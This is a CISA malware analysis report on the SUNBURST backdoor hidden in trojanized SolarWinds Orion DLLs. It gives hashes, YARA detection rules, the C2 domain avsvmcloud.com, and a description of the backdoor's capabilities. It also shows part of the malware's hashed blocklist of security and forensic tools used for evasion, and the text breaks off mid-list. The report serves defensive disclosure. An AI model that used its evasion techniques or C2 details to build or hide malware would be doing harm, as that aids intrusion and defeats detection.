{
  "markdown": "\nUpdated April 15, 2021: The U.S. Government attributes this activity to the Russian Foreign Intelligence Service (SVR). Additional information may be found in a statement from the White House. For more information on SolarWinds-related activity, go to https://us-cert.cisa.gov/remediating-apt-compromised-networks and https://www.cisa.gov/supply-chain-compromise.\n\u00a0\n\n\n\n\n\n\n\nMalware Analysis Report\n10318845.r1.v1\n2021-02-05\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.\n\nSummary\n\nDescription\nThis report provides detailed analysis of several malicious artifacts associated with a sophisticated supply chain compromise of SolarWinds Orion network management software, identified by the security company FireEye as SUNBURST.\n\n\t\t\tAfter being delivered as part of certain SolarWinds updates, a trojanized version of the \u201csolarwinds.orion.core.businesslayer.dll\u201d containing SUNBURST malware is installed by a legitimate SolarWinds installer application. The modified dynamic-link library (DLL) contains an obfuscated backdoor that allows a remote operator to execute various functions on the compromised system, as well as deploy additional payloads and exfiltrate data. The embedded SUNBURST code encrypts its outbound communications to the remote operator using XOR encryption and modified Base64 encoding. To maintain a low profile, the SUNBURST code will not run if it detects certain security software running on the target system.\nFor a downloadable copy of IOCs, see: MAR-10318845-1.v1.stix.\nSubmitted Files (4)\n019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134 (SolarWinds.Orion.Core.Business...)\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77 (SolarWinds.Orion.Core.Business...)\nce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6 (SolarWinds.Orion.Core.Business...)\nd0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600 (SolarWinds-Core-v2019.4.5220-H...)\nDomains (1)\navsvmcloud.com\n\nFindings\n\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\nTags\nbackdoorremote-access-trojantrojan\nDetails\n\n\n\nName\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nSize\n1011032 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\nMD5\nb91ce2fa41029f6955bff20079468448\n\n\nSHA1\n76640508b1e7759e548771a5359eaed353bf1eec\n\n\nSHA256\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\n\nSHA512\n6a81f082f36ccbda48070772c5a97e1d7de61ad77465e7befe8cbd97df40dcc5da09c461311708e3d57527e323484b05cfd3e72a3c70e106e47f44cc77584bd7\n\n\nssdeep\n12288:Zx7m/z9aEBzvnvLtYAi6uLlYQ69BBpIvF1tjpH7BKi+0A8vca9owQ:6aEBTvRBi6uL6dIvDtjpH9+0A8vca9oD\n\n\nEntropy\n5.582827\n\n\n\nAntivirus\n\n\n\nAhnlab\nBackdoor/Win32.SunBurst\n\n\nAntiy\nTrojan[Backdoor]/MSIL.Agent\n\n\nAvira\nTR/Sunburst.AO\n\n\nBitDefender\nTrojan.Sunburst.A\n\n\nClamav\nWin.Countermeasure.Sunburst-9809152-0\n\n\nComodo\nBackdoor\n\n\nCyren\nW32/Trojan.BCCG-2955\n\n\nESET\na variant of MSIL/SunBurst.A trojan\n\n\nEmsisoft\nTrojan.Win32.Sunburst (A)\n\n\nIkarus\nBackdoor.Sunburst\n\n\nK7\nTrojan ( 00574a531 )\n\n\nLavasoft\nTrojan.Sunburst.A\n\n\nMcAfee\nTrojan-sunburst\n\n\nMicrosoft Security Essentials\nTrojan:MSIL/Solorigate.BR!dha\n\n\nNANOAV\nTrojan.Win32.SunBurst.iduxjk\n\n\nSophos\nMal/Sunburst-A\n\n\nSymantec\nBackdoor.Sunburst!gen1\n\n\nSystweak\ntrojan-backdoor.sunburst-r\n\n\nTrendMicro\nBackdoo.6F8C6A1E\n\n\nTrendMicro House Call\nBackdoo.6F8C6A1E\n\n\nVir.IT eXplorer\nTrojan.Win32.SunBurst.A\n\n\nVirusBlokAda\nTScope.Trojan.MSIL\n\n\nZillya!\nBackdoor.Sunburst.Win32.2\n\n\n\nYARA Rules\n\nrule CISA_10318927_01 : trojan rat SOLAR_FIRE\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10318927\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_2145\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"TROJAN RAT\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SOLAR_FIRE\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"This signature is based off of unique strings embedded within the modified Solar Winds app\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"b91ce2fa41029f6955bff20079468448\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_2 = \"846e27a652a5e1bfbd0ddd38a16dc865\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_2 = \"ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 63 00 30 00 6B 00 74 00 54 00 69 00 37 00 4B 00 4C 00 43 00 6A 00 4A 00 7A 00 4D 00 38 00 44 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 41 00 41 00 3D 00 3D 00 00 21 38 00 33 00 56 00 30 00 64 00 6B 00 78 00 4A 00 4B 00 55 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 63 00 2F 00 46 00 77 00 44 00 6E 00 44 00 4E 00 53 00 30 00 7A 00 4B 00 53 00 55 00 30 00 42 00 41 00 41 00 3D 00 3D }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 53 00 69 00 30 00 75 00 42 00 67 00 41 00 3D 00 00 21 38 00 77 00 77 00 49 00 4C 00 6B 00 33 00 4B 00 53 00 79 00 30 00 42 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\tall of them\n\t\t\t\t}\nrule FireEye_20_00025668_01 : SUNBURST APT backdoor\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"FireEye\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_1917\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Backdoor\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SUNBURST\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor matches a magic byte xor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$cmd_regex_encoded = \"U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 31 36 7D }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_event_encoded = \"U3ItS80rCaksSFWyUvIvyszPU9IBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_eventmanager_encoded = \"U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_message_encoded = \"U/JNLS5OTE9VslKqNqhVAgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fnv_xor and ($cmd_regex_encoded or $cmd_regex_plain) or ( ($fake_orion_event_encoded or $fake_orion_event_plain) and ($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_message_plain) )\n\t\t\t\t}\nrule FireEye_20_00025668_02 : SUNBURST APT backdoor\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"FireEye\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_1917\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Backdoor\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SUNBURST\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$a = \"0y3Kzy8BAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$aa = \"S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ab = \"S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ac = \"C88sSs1JLS4GAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ad = \"C/UEAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ae = \"C89MSU8tKQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$af = \"8wvwBQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ag = \"cyzIz8nJBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ah = \"c87JL03xzc/LLMkvysxLBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ai = \"88tPSS0GAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$aj = \"C8vPKc1NLQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ak = \"88wrSS1KS0xOLQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$al = \"c87PLcjPS80rKQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$am = \"Ky7PLNAvLUjRBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$an = \"06vIzQEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$b = \"0y3NyyxLLSpOzIlPTgQA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$c = \"001OBAA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$d = \"0y0oysxNLKqMT04EAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$e = \"0y3JzE0tLknMLQAA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$f = \"003PyU9KzAEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$h = \"0y1OTS4tSk1OBAA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$i = \"K8jO1E8uytGvNqitNqytNqrVA/IA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$j = \"c8rPSQEA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$k = \"c8rPSfEsSczJTAYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$l = \"c60oKUp0ys9JAQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$m = \"c60oKUp0ys9J8SxJzMlMBgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$n = \"8yxJzMlMBgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$o = \"88lMzygBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$p = \"88lMzyjxLEnMyUwGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$q = \"C0pNL81JLAIA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$r = \"C07NzXTKz0kBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s = \"C07NzXTKz0nxLEnMyUwGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t = \"yy9IzStOzCsGAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$u = \"y8svyQcA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$v = \"SytKTU3LzysBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$w = \"C84vLUpOdc5PSQ0oygcA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$x = \"C84vLUpODU4tykwLKMoHAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$y = \"C84vLUpO9UjMC07MKwYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$z = \"C84vLUpO9UjMC04tykwDAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($aa or $ab)) or ($t and $u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and $aj and $ak and $al and ($am or $an))\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-03-24 04:52:34-04:00\n\n\nImport Hash\ndae02f32a21e03ce65412f6e56942daa\n\n\nCompany Name\nSolarWinds Worldwide, LLC.\n\n\nFile Description\nSolarWinds.Orion.Core.BusinessLayer\n\n\nInternal Name\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nLegal Copyright\nCopyright \u00a9 1999-2020 SolarWinds Worldwide, LLC. All Rights Reserved.\n\n\nOriginal Filename\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nProduct Name\nSolarWinds.Orion.Core.BusinessLayer\n\n\nProduct Version\n2019.4.5200.9083\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n9f1dcf8b4df81fdd1e33e8157fb58d9f\nheader\n512\n2.890704\n\n\nac9dc455a67c7f2c9f10725d66c115d1\n.text\n1001472\n5.569219\n\n\n69a064c0b6001299af109ed0d06f6c6f\n.rsrc\n1536\n3.015713\n\n\n275a7e1f11b8e5fefa163e47c22129b4\n.reloc\n512\n0.101910\n\n\n\nRelationships\n\n\n\n32519b85c0...\nConnected_To\navsvmcloud.com\n\n\n32519b85c0...\nContained_Within\nd0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600\n\n\n\nDescription\nThis file is a 32-bit .NET DLL named \"SolarWinds.Orion.Core.BusinessLayer.dll.\" It is a modified SolarWinds-signed plugin component of the Orion software framework that has been patched with the SUNBURST backdoor. This malicious file was signed with a digital certificate issued by Symantec to SolarWinds. The digital certificate should be considered compromised.\n\n\t\t\t--Begin Digital Certificate Information--\n\t\t\tSigner: \u00a0\u00a0\u00a0 CN=\"Solarwinds Worldwide, LLC\", O=\"Solarwinds Worldwide, LLC\", L=Austin, S=Texas, C=US\n\t\t\tIssuer: \u00a0\u00a0\u00a0 CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=SymantecCorporation, C=US\n\t\t\tSN: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 0FE973752022A606ADF2A36E345DC0ED\n\t\t\tNot Before: 1/20/2020 7:00:00 PM\n\t\t\tNot After: 1/20/2023 6:59:59 PM\n\t\t\tThumbprint: 47D92D49E6F7F296260DA1AF355F941EB25360C4\n\t\t\tStatus: \u00a0\u00a0\u00a0 Valid\n\t\t\tStatusMsg: Signature verified.\n\t\t\t--End Digital Certificate Information--\n\n\t\t\tSUNBURST provides the following capabilities on a compromised system, which are discussed in further detail below.\n\n\t\t\t- Sets a 12 to 14 day delayed execution time\n\t\t\t- Stealth\n\t\t\t- Command and Control (C2) communication\n\t\t\t- Collect system information\n\t\t\t- Upload system information from the victim system\n\t\t\t- Run specified tasks\n\t\t\t- Terminate processes\n\t\t\t- Download, read, write, move, delete, and execute files\n\t\t\t- Compute file hashes\n\t\t\t- Reboot the system\n\t\t\t- Adjust process privileges\n\n\n\t\t\t**DELAYED EXECUTION**\n\t\t\tSUNBURST is executed by a legitimate SolarWinds software application designed to load and run SolarWinds plugins. Once installed, it compares its last write time to a randomly generated value between 288 and 336 hours (12 - 14 days) after the file was written. The malware will sleep until this calculated time frame has passed, after which, the malware will begin C2 sessions to retrieve and execute commands or \"Jobs\u201d on behalf of the adversary.\n\n\t\t\t**STEALTH**\n\t\t\tSUNBURST uses obfuscated blocklists consisting of hashed process and service names to identify analysis tools and antivirus software components running as processes, services, and drivers. It utilizes a modified version of the FNV-1a hash algorithm to determine if specific processes are running on the target system. It will enumerate and hash the process names of all running processes and compare the generated hashes to a hard-coded blocklist. If no block-listed processes are found, it will attempt to resolve the domain \"api.solarwinds.com\" to test for network connectivity. If a block-listed process is found, it does not proceed with its C2 session. This evasion technique is used to keep it from being detected. The hard coded hashed process names are stored in an unsigned LONG list named \"assemblyTimeStamps.\" See \u201c**BLOCK LIST CHECKING FUNCTIONS**\u201d below in this report for details.\n\n\t\t\t--Begin hard-coded list of block-listed processes and names--\n\t\t\t1475579823244607677 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 100-continue\n\t\t\t2734787258623754862 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 accept\n\t\t\t1368907909245890092 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 afwserv\n\t\t\t16858955978146406642 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0apac.lab\n\t\t\t2597124982561782591 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 apimonitor-x64\n\t\t\t2600364143812063535 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 apimonitor-x86\n\t\t\t6195833633417633900 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 aswengsrv\n\t\t\t2934149816356927366 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 aswidsagent\n\t\t\t13029357933491444455 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0aswidsagenta\n\t\t\t15194901817027173566 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0atrsdfw.sys\n\t\t\t4821863173800309721 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 autopsy\n\t\t\t13464308873961738403 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0autopsy64\n\t\t\t3320026265773918739 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 autoruns\n\t\t\t12969190449276002545 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0autoruns64\n\t\t\t10657751674541025650 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0autorunsc\n\t\t\t12094027092655598256 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0autorunsc64\n\t\t\t2760663353550280147 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 avastavwrapper\n\t\t\t8146185202538899243 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 avastsvc\n\t\t\t11818825521849580123 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0avastui\n\t\t\t11109294216876344399 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0avgadminclientservice\n\t\t\t2797129108883749491 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 avgidsagent\n\t\t\t3660705254426876796 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 avgsvc\n\t\t\t3890794756780010537 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 avgsvca\n\t\t\t3890769468012566366 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 avgsvcx\n\t\t\t12709986806548166638 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0avgui\n\t\t\t14095938998438966337 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0avgwdsvcx\n\t\t\t13611051401579634621 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0avp\n\t\t\t18147627057830191163 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0avpui\n\t\t\t16423314183614230717 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bccavsvc\n\t\t\t11913842725949116895 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0binaryninja\n\t\t\t5449730069165757263 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 blacklight\n\t\t\t12679195163651834776 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0brcow_x_x_x_x.sys\n\t\t\t1614465773938842903 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 brfilter.sys\n\t\t\t11385275378891906608 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0carbonblack\n\t\t\t13693525876560827283 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0carbonblackk\n\t\t\t17204844226884380288 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cavp\n\t\t\t5984963105389676759 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 cb\n\t\t\t17849680105131524334 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cbcomms\n\t\t\t18246404330670877335 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cbstream\n\t\t\t292198192373389586 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cff explorer\n\t\t\t14226582801651130532 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0close\n\t\t\t11266044540366291518 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0connection\n\t\t\t6116246686670134098 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 content-type\n\t\t\t10734127004244879770 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cork.lab\n\t\t\t18159703063075866524 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0crexecprev.sys\n\t\t\t11771945869106552231 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0csagent\n\t\t\t9234894663364701749 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 csdevicecontrol\n\t\t\t9061219083560670602 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 csfalconcontainer\n\t\t\t8698326794961817906 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 csfalconservice\n\t\t\t12790084614253405985 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cutter\n\t\t\t16570804352575357627 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cve.sys\n\t\t\t17097380490166623672 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0cybkerneltracker.sys\n\t\t\t16066522799090129502 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0date\n\t\t\t5219431737322569038 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 de4dot\n\t\t\t15535773470978271326 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0debugview\n\t\t\t11073283311104541690 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0dev.local\n\t\t\t3626142665768487764 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 dgdmk.sys\n\t\t\t7810436520414958497 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 diskmon\n\t\t\t4030236413975199654 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 dmz.local\n\t\t\t13316211011159594063 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0dnsd\n\t\t\t13825071784440082496 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0dnspy\n\t\t\t14480775929210717493 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0dotpeek32\n\t\t\t14482658293117931546 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0dotpeek64\n\t\t\t8473756179280619170 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 dumpcap\n\t\t\t15587050164583443069 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0eamonm\n\t\t\t12718416789200275332 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0eaw.sys\n\t\t\t9559632696372799208 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 eelam\n\t\t\t607197993339007484 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0egui\n\t\t\t14513577387099045298 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0eguiproxy\n\t\t\t4931721628717906635 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ehdrv\n\t\t\t14079676299181301772 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0ekbdflt\n\t\t\t3200333496547938354 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ekrn\n\t\t\t2589926981877829912 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ekrnepfw\n\t\t\t8727477769544302060 